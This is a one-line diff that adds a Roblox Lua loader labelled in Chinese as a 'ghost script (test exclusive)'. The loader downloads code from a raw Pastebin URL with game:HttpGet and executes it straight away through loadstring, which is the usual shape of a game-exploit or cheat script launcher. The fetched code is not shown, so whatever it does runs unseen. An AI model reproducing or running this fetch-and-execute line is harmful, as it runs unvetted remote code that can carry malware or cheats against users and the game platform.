@@ -1,1 +1,1 @@
-123
+getgenv().Ghost="鬼脚本（测试专属）"loadstring(game:HttpGet("https://pastebin.com/raw/DCGzQ6iY"))()
